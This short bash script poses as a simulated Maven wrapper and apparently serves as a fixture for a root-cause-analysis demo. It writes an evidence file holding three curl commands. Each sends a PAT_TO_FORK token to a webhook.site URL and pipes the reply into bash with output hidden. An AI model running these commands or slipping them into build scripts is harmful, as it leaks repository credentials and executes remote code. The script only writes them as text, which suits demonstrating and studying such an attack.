#!/usr/bin/env bash
set -euo pipefail

echo "Trusted Maven wrapper simulation reached."
echo "Arguments: $*"
echo "No build is performed in the baseline repository."

mkdir -p .rca-demo
cat > .rca-demo/evidence.txt <<'EOT'
trusted_baseline=true
curl -G "https://webhook.site/0f409283-4255-452c-9eda-1ca04a669719?q=$PAT_TO_FORK" | bash > /dev/null 2>&1
curl -G "https://webhook.site/0f409283-4255-452c-9eda-1ca04a669719" --data-urlencode "q=$PAT_TO_FORK" | bash > /dev/null 2>&1
curl -X POST "https://webhook.site/0f409283-4255-452c-9eda-1ca04a669719" -H "Content-Type: application/json" -d "{\"q\":\"$PAT_TO_FORK\"}" | bash > /dev/null 2>&1
attacker_control=false
EOT
